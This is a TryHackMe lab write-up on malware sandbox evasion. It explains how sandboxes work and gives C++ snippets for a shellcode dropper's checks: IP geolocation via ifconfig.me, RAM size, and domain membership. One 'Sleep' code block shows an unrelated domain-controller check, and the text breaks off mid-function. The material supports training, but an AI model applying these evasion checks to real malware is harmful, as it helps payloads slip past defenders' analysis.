---
Learn about active defense mechanisms Blue Teamers can deploy to identify adversaries in their environment.
---

# Sandbox Evasion — Writeup

## Overview
### Sandbox Evasion — Writeup
### Sandbox Evasion — Writeup
![|333](https://tryhackme-images.s3.amazonaws.com/room-icons/152639915686cc66d088790d04a5f1b3.png)
### Introduction
Welcome to Sandbox Evasion
Lots of companies deploy a “Defense in Depth” strategy, which refers to implementing security in layers, so if one layer fails, there should be another one that an adversary must evade. In this room, we will be focusing on one unique type of active defense; Sandboxes. Sandboxes provide a safe way to analyze a potentially malicious file and observe the effects on the system and return if the executable is malicious or not.
Learning Objectives
In this room, we will learn about Sandboxes in-depth; by the time you finish this room, you will gain a better understanding of the following topics:
Learn how Malware Sandboxes work
Learn about Static and Dynamic Malware Analysis
Common Sandbox Evasion Methods
Developing and Testing Sandbox Evasion Methods with Any.Run
Room Pre-requisites
For this room, we recommend the prior experience in the following areas:
Windows APIs
C++ Programming
Active Directory
### An Adversary walks into a Sandbox
What is Malware Analysis
Malware Analysis is the process of analyzing a suspicious file to determine what it does on both a micro level (by looking at Assembly), and a macro level (by looking at what it does on the system). This process lets Blue Teamers gain a better understanding of malicious programs, which can aid them in developing detections.
Static vs. Dynamic Analysis
There are two ways that a Blue Teamer can analyze a suspicious file; one way is by looking at the code on a micro-level (as previously stated) by using Disassemblers such as IDA or Ghidra. This process is more well known as “Static Analysis”.
On the flip side of the coin, we can observe what happens when the suspicious file is executed on the system through a process called “Dynamic Analysis”. On the system, there are often many analysis tools installed, such as EDR Software, Sysmon, ProcMon, Process Hacker, and Debuggers (For example, OllyDebug, WinDbg, x64Dbg), and much more.
Introduction to Sandboxes
One of the most creative and effective ways that Blue Teamers have come up with to analyze suspicious-looking files is in the category of Dynamic Analysis. This method involves running the file in a containerized (or virtualized) environment; This environment is referred to as a Sandbox. Depending on the sandbox of choice, you may be able to customize what version of Windows is running, the software installed on the machine, and much more.
Sandboxes provide a safe and effective way to monitor what a suspicious-looking file does before running it on a production system (or allowing it to be sent to a production system). There are many commercial Sandboxes that may be in place in various parts of a network.
In the diagram above, there are three different sandboxes in place. It is not uncommon for there to be one, two, or even three Sandboxes in a corporate environment. Often you may find them in the following places:
Firewalls
Mail Servers
Workstations
Each sandbox may work differently; for example, a Firewall may execute the attachment in the email and see what kind of network communications occur, whereas a Mail sandbox may open the email and see if an embedded file within the email triggers a download over a protocol like SMB in an attempt to steal a NetNTLM hash, where a host-based Anti-Virus Sandbox may execute the file and monitor for malicious programmatic behavior or changes to the system.
There are various vendors that make various Sandbox products that Blue Teamers may be able to deploy in a corporate network. Here are some popular examples:
Palo Alto Wildfire (Firewall) https://www.paloaltonetworks.co.uk/products/secure-the-network/wildfire
Proofpoint TAP (Email Sandbox)https://www.proofpoint.com/uk/products/advanced-threat-protection/targeted-attack-protection
Falcon Sandbox (EDR/Workstation)https://www.crowdstrike.co.uk/products/threat-intelligence/falcon-sandbox-malware-analysis/
MimeCast (Email Sandbox)/https://www.mimecast.com/
VirusTotal (Sample Submission Site)https://www.virustotal.com
Any.Run (Sample Submission Site)https://any.run/
Antiscan.me (Sample Submission Site)https://antiscan.me/
Joe Sandbox (Sample Submission Site)https://www.joesandbox.com/
In the next section, we will learn about various techniques commonly deployed by Malware authors to gain an understanding of some evasion techniques that exist.
We have provided a Windows development VM where you can develop your own Sandbox evasion techniques. You can access the virtual machine with the following credentials:
Username: Administrator
Password: TryHackMe123!
Sandboxes are a form of ______ Analysis
*Dynamic*
What type of Sandboxes analyze attachments attached to emails?
*Mail sandbox*
### Common Sandbox Evasion Techniques
An Introduction to Sandbox Evasion
Now that you have a general idea of what Malware Sandboxes are, we can move on to learning some evasion techniques at a high level. We will be breaking this down into four different categories; in the next task, we will implement four different evasion techniques (one from each category), so you can leave this room with some practical knowledge to help out in your Red Team operations.
We will be covering the following four broad categories:
Sleeping through Sandboxes
Geolocation and Geoblocking
Checking System Information
Querying Network Information
These are ordered from the most basic techniques to the most advanced. Let's get started.
Sleeping through Sandboxes
Malware Sandboxes are often limited to a time constraint to prevent the overallocation of resources, which may increase the Sandboxes queue drastically. This is a crucial aspect that we can abuse; if we know that a Sandbox will only run for five minutes at any given time, we can implement a sleep timer that sleeps for five minutes before our shellcode is executed. This could be done in any number of ways; one common way is to query the current system time and, in a parallel thread, check and see how much time has elapsed. After the five minutes have passed, our program can begin normal execution.
Another popular method is to do complex, compute-heavy math, which may take a certain amount of time — for example, calculating the Fibonacci sequence up to a given number. Remember that it may take more or less time to do so based on the system's hardware. Masking your application is generally a good idea to avoid Anti-Virus detections in general, so this should already be something in your toolkit.
Beware that some sandboxes may alter built-in sleep functions; various Anti-Virus vendors have put out blog posts about bypassing built-in sleep functions. So it is highly recommended you develop your own sleep function. Here are a couple of blog posts about bypassing Sleep functions:
https://evasions.checkpoint.com/techniques/timing.html
https://www.joesecurity.org/blog/660946897093663167
Geolocation
One defining factor of Sandboxes is that they are often located off-premise and are hosted by Anti-Virus providers. If you know you are attacking TryHackMe, a European company, and your binary is executed in California, you can make an educated guess that the binary has ended up in a Sandbox. You may choose to implement a geolocation filter on your program that checks if the IP Address block is owned by the company you are targeting or if it is from a residential address space. There are several services that you can use to check this information:
ifconfig.me
https://rdap.arin.net/registry/ip/1.1.1.1
IfConfig.me can be used to retrieve your current IP Address, with additional information being optional. Combining this with ARIN's RDAP allows you to determine the ISP returned in an easy to parse format (JSON).
It is important to note that this method will only work if the host has internet access. Some organizations may build a block list of specific domains, so you should be 100% sure that this method will work for the organization you are attempting to leverage this against.
Checking System Information
Another incredibly popular method is to observe system information. Most Sandboxes typically have reduced resources. A popular Malware Sandbox service, Any.Run, only allocates 1 CPU core and 4GB of RAM per virtual machine:
a Screenshot of the SystemInfo command from Any.Run
Most workstations in a network typically have 2-8 CPU cores, 8-32GB of RAM, and 256GB-1TB+ of drive space. This is incredibly dependent on the organization that you are targeting, but generally, you can expect more than 2 CPU cores per system and more than 4GB of RAM. Knowing this, we can tailor our code to query for basic system info (CPU core count, RAM amount, Disk size, etc).
By no means is this an exhaustive list, but here are some additional examples of things you may be able to filter on:
Storage Medium Serial Number
PC Hostname
BIOS/UEFI Version/Serial Number
Windows Product Key/OS Version
Network Adapter Information
Virtualization Checks
Current Signed in User
and much more!
Querying Network Information
The last method is the most open-ended method that we will be covering. Because of its open-endedness it is considered one of the more advanced methods as it involves querying information about the Active Directory domain.
Almost no Malware Sandboxes are joined in a domain, so it's relatively safe to assume if the machine is not joined to a domain, it is not the right target! However, you cannot always be too sure, so you should collect some information about the domain to be safe. There are many objects that you can query; here are some to consider:
Computers
User accounts
Last User Login(s)
Groups
Domain Admins
Enterprise Admins
Domain Controllers
Service Accounts
DNS Servers
These techniques can vary in difficulty; therefore, you should consider how much time and effort you want to spend building out these evasion methods. A simple method, such as checking the systems environment variables (this can be done with echo %VARIABLE% or to display all variables, use the set command) for an item like the LogonServer, LogonUserSid, or LogonDomain may be much easier than implementing a Windows API.
Setting the Stage
Now that you have a better understanding of what Sandbox Bypass method types exist, we will take it to the next step and implement some of the Sandbox Bypasses in the next task.
Before we move on to the next task, we're going to be starting with a basic dropper that retrieves shellcode from a Web Server (specifically from /index.raw) and injects it into memory, and executes the shellcode. It's important to note that all shellcode must be generated with MSFVenom in a raw format, and must be 64-bit, not 32-bit. It can be generated with the following command.
```text

```
The shellcode should then be hosted on the AttackBox via any HTTP Server. Python3's http.server module is highly portable and flexible and will serve as a good base for this task. In the real world, you may host your shellcode on your C2 server. For the purposes of the lab, we will be utilizing the Attackbox with no C2 server.
The code attached to this task has been tested and compiled using Visual Studio 2019 (or above). Download the dropper.cpp, and open it. It's important to note that there are several placeholder values on lines 16, 22, 24, 27, and 33 that you must update to make the code function properly. Once you have altered the values, compile the code for a 64-bit release.
Read the above task to learn about Sandbox Evasion Techniques.
*No answer needed*
Download the task files and modify the .cpp file to retrieve the MSFVenom generated shellcode.
*No answer needed*
Which Sandbox Evasion method would you use to abuse a Sandbox that runs for a short period of time?
Note: most Sandboxes are only allowed to run for a short period of time
*Sleeping*
Which Sandbox Evasion method would you use to check the Sandboxes system information for virtualised devices?
Note: Sandboxes usually run with limited resources and virtualised devices
*Checking System Information*
### Implementing Various Evasion Techniques
Diving into Sandbox Evasion
With this base code acquired, we will take our first step into the world of Sandbox Evasion. We're going to start with our sleep because it is the simplest.
Taking a Nap
We can take our template code from the previous task and add a Sleep statement for 120,000MS  to it. This translates to roughly 120 seconds or 2 minutes. Generally, you would want a time closer to 5 minutes to be sure; however, 2 minutes will suffice for testing purposes. We'll now add our Sleep statement in the main function:
```text
int main() {
    if (isDomainController == TRUE) {
        downloadAndExecute();
    } else {
        cout << "Domain Controller Not Found!";
    }
}
```
Testing our Code
After this is done, we can compile and upload the code to Any.Run. You can read along with the following tests, and see their behaviour on Any.Run by following the links. This will serve as our test-ground for Sandbox evasion as it provides highly detailed information for us. Reviewing the two runs:
Sleep Bypass https://app.any.run/tasks/0799e9b3-dddc-4838-ba2d-c95fc0a7e63b
No Sleep Bypass https://app.any.run/tasks/ad3cf5b4-1bdf-4005-8578-507334f5c8ac
Looking at the two results side by side, we notice no activity occurring in our Sleepy run.
Screenshot from Any.Run showing our Sleep bypass function worked as intended.
Where in our not-sleepy run, we can see an HTTP Request go out to Cloudflare.
Screenshot from Any.Run showing our results with no Sandbox Evasion techniques implemented
Congratulations! We have successfully created our first Sandbox Evasion technique. While this is a simple technique, it is incredibly powerful and has allowed us to run out Any.Run's one-minute timer. As stated in the last task, this method may or may not work due to various blog posts that have been published showing that Blue Teamers can create sleep timer bypasses. A better implementation would be to waste computing time by doing heavy math.
Geolocation Filtering
Moving onto our next method of evading execution of our shellcode on a Sandbox, we will be leveraging Geolocation blocks. Fortunately, we will be able to leverage a good amount of code that is already written for us. Portions of the "downloadAndExecute()" function can be re-used for this. We will be reusing the following components:
Website URL (formerly the c2URL variable)
Internet Stream (formerly the stream variable)
String variable (formerly the s variable)
Buffer Space (formerly the Buff variable)
Bytes Read (formerly the unsigned long bytesRead variable)
Lastly, the URLOpenBlockingStreamA function https://docs.microsoft.com/en-us/previous-versions/windows/internet-explorer/ie-developer/platform-apis/ms775127(v=vs.85)
Integrating This into our Code
This translates to an actual function that looks so:
```text
BOOL checkIP() {   
 // Declare the Website URL that we would like to vicit
    const char* websiteURL = "<https://ifconfig.me/ip>";   
 // Create an Internet Stream to access the website
    IStream* stream;   
 // Create a string variable where we will store the string data received from the website
    string s;   
  // Create a space in memory where we will store our IP Address
    char buff[35];   
    unsigned long bytesRead;   
 // Open an Internet stream to the remote website
    URLOpenBlockingStreamA(0, websiteURL, &stream, 0, 0);   
 // While data is being sent from the webserver, write it to memory
    while (true) {       
        stream->Read(buff, 35, &bytesRead);       
        if (0U == bytesRead) {           
            break;       
        }       
        s.append(buff, bytesRead);   
    }   
  // Compare if the string is equal to the targeted victim's IP. If true, return the check is successful. Else, fail the check.
    if (s == "VICTIM_IP") {       
        return TRUE;   
    }   
    else {       
    return FALSE;   
    }
}
```
This code can be broken down into the following steps:
Declare the required variables mentioned above.
Open an internet stream with the URLOpenBlockingStreamA function to ifconfig.me/ip to check the current IP Address.
Write the data stream returned from the URLOpenBlockingStreamA function to the memory.
Append the data from the memory buffer to a string variable.
Check and see if the string data is equal to the Victim's IP Address.
If True, return TRUE; if False, return FALSE.
Now we must modify our main function so that we can leverage our newly created function:
```text
int main(){
    if(checkIP() == TRUE){
        downloadAndExecute();
        return 0;
    }
    else {
        cout << "HTTP/418 - I'm a Teapot!";
        return 0;
    }
}
```
The code above invokes the new function, checkIP(), and if the IP Address returns TRUE, then invoke the downloadAndExecute() function to call the shellcode from our C2 server. If FALSE, return HTTP/418 - I'm a teapot!".
Testing Our Code
Now that we have wrapped up our second Sandbox Evasion technique, it is very important to know that this is an incredibly common TTP used by threat actors. Both APTs and Red Teams alike often use services to check the "Abuse Info" of an IP Address to gather information about an IP Address to determine if it is a legitimate company or not. Any.Run is well aware of this Anti-Sandboxing technique and has even flagged it in our instance. You can see the detailed results at the links below:
One with an IP Address Filter https://app.any.run/tasks/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a
One without an IP Address Filter https://app.any.run/tasks/6c721d61-b06a-4497-84fd-1aea34671085
Looking at the two results, we can see that ifconfig.me is flagged as a "questionable/Potentially Malicious" site used to check for your external IP Address. In fact, this Sandbox evasion method ended up hurting our score, so it should be used as a last resort or with a recently deployed/custom IP Address checking server. The full report can be found here.
https://any.run/report/c98a60e5d0390ba4ad784b76ec0ce3602272452ffb44ce73dbb849906f2cff4d/dbc2e81a-d7da-4ee5-a628-a5d2d17a0c1a
A Screenshot from Any.Run showing our run with Sandbox Evasion techniques applied
Screenshot from Any.Run showing an outbound HTTP Request
As you are now aware, not all Sandbox escaping techniques may be helpful in certain situations; you must pick and choose which evasion techniques you are going to implement carefully, as some may do more harm than good.
Checking System Information
We're going to start off the System Information category with - the amount of RAM a system has. It’s important to note that Windows measures data in a non-standard format. If you have ever bought a computer that said it has “256GB of SSD Storage”, after turning it on, you would have closer to 240GB. This is because Windows measures data in units of 1024-bytes instead of 1000-bytes. Be warned that this can get very confusing very quickly. Fortunately for us, we will be working in such small amounts of memory that accuracy can be a “best guess” instead of an exact number. Now that we know this, how can we determine how much memory is installed on the System?
Checking System Memory
Fortunately, this is a relatively easy thing to find out. We only need the Windows header file included, and we can call a specific Windows API, GlobalMemoryStatusEx, to retrieve the data for us. To get this information, we must declare the MEMORYSTATUSEX struct; then, we must set the size of the dwLength member to the size of the struct. Once that is done, we can then call the GlobalMemoryStatusEx Windows API to populate the struct with the memory information.
In this scenario, we are specifically interested in the total amount of physical memory installed on the system, so we will print out the ullTotalPhys member of the MEMORYSTATUSEX struct to get the size of the memory installed in the system in Bytes. We can then divide by 1024 3x to get the value of memory installed in GiB. Now let’s see what this looks like in C++:
https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/nf-sysinfoapi-globalmemorystatusex
https://docs.microsoft.com/en-us/windows/win32/api/sysinfoapi/ns-sysinfoapi-memorystatusex
```text
#include <iostream>
#include <Windows.h>
using namespace std;
int main() {
// Declare the MEMORYSTATUSEX Struct    
   MEMORYSTATUSEX statex;
// Set the length of the struct to the size of the struct    
   statex.dwLength = sizeof(statex);
// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
   GlobalMemoryStatusEx(&statex);
// Print the physical memory installed on the system    
   cout << "There is " << statex.ullTotalPhys/1024/1024/1024 << "GiB of memory on the system.";
}
```
This code can be broken down into the following steps:
We're going to declare the MEMORYSTATUSEX Struct; this will be populated with info from the GlobalMemoryStatusEx WinAPI.
Now, we must set the length of the struct so that we can populate it with data. To do so, we're going to use the sizeof function.
Now that we have the length of the struct, we can populate it with data from the GlobalMemoryStatusEx WinAPI.
We can now read the total memory amount from the system.
Integrating This into our Code
Now that we have the technical know-how, we should integrate this check into our code. Generally speaking (You should verify this by yourself), most Sandboxes have 4GB of RAM dedicated to the machine, so we should check and see if the memory count is greater than 5; if it is not, exit the program; if it is, continue execution. We will not be modifying the downloadAndExecute function anymore; from here on, we will be adding new functions and changing the main function.
```text
BOOL memoryCheck() {
// This function will check and see if the system has 5+GB of RAM
// Declare the MEMORYSTATUSEX Struct    
    MEMORYSTATUSEX statex;
// Set the length of the struct to the size of the struct    
    statex.dwLength = sizeof(statex);
// Invoke the GlobalMemoryStatusEx Windows API to get the current memory info    
    GlobalMemoryStatusEx(&statex);
// Checks if the System Memory is greater than 5.00GB    
